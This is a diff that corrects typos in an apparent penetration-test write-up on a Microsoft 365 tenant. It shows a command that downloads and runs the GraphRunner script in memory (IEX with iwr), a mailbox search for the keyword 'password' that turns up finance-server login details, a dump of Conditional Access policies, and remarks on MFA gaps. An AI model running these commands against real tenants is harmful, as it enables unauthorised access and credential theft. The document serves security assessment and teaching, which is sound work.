@@ -82,7 +82,7 @@ Which returns a Microsoft 365 license.
 
 ![](images/Pasted%20image%2020260830224954.png)
 
-Now I'll run [GraphRunner](https://github.com/dafthack/GraphRunner) to start searching the data the user has access to with keywords, from the 'Pillage' section.
+Now I'll run [GraphRunner](https://github.com/dafthack/GraphRunner) to start searching for data the user has access to with keywords, from the 'Pillage' section.
 
 ``` Powershell
 IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')
@@ -159,7 +159,7 @@ Let's continue our search, but this time look through the emails.
 Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
 ```
 
-Here I get an email previous showing login details and a finance server!
+Here I get an email preview showing login details and a finance server!
 
 ![](images/Pasted%20image%2020260830223513.png)
 
@@ -229,7 +229,7 @@ Another factor was the communication channels and files used to discuss and stor
 
 MFA is going to be one of the strongest security options that can be configured for users. Having this enabled is going to require that extra step from threat actors to get around that really stops them at the initial attempts to log in.
 
-It's not like MFA is not used. This just happened to be a whole. GraphRunner can provide Conditional Access policy with the following, which shows 40 active policies.
+It's not like MFA is not used. This just happened to be a hole. GraphRunner can provide Conditional Access policy with the following, which shows 40 active policies.
 
 ```Powershell
 Invoke-DumpCAPS
